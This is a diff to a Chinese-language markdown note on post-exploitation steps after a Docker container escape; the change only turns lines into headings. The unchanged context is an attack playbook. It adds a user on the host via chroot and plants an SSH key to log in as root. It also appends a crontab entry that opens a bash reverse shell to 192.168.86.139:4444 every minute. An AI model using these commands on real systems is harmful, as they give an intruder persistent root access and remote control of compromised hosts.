@@ -1,4 +1,4 @@
-逃逸成功之后操作---docker
+# 逃逸成功之后操作---docker
 
 逃逸成功，后续操作
 
@@ -9,7 +9,7 @@
 ```
  
 
-1、添加用户
+## 1、添加用户
 ```shell
 chroot /test1 adduser john
 ```
@@ -33,7 +33,7 @@ sudo -s
 
  
 
-2、写入ssh key密钥登录
+## 2、写入ssh key密钥登录
 ```shell
 cd /test1/root/.ssh 到root ssh目录
 本机执行：ssh-keygen -t ed25519 -N "123456"
@@ -61,7 +61,7 @@ ssh -i id_ed25519 root@192.168.86.218
 
  
 
-3、计划任务反弹shell【根据对方系统不同，反弹shell命令不同】
+## 3、计划任务反弹shell【根据对方系统不同，反弹shell命令不同】
 ```shell
 echo -e "\* \* \* \* \* root bash -i \>& /dev/tcp/192.168.86.139/4444 0\>&1\\n" \>\> /test1/etc/crontab
 ```
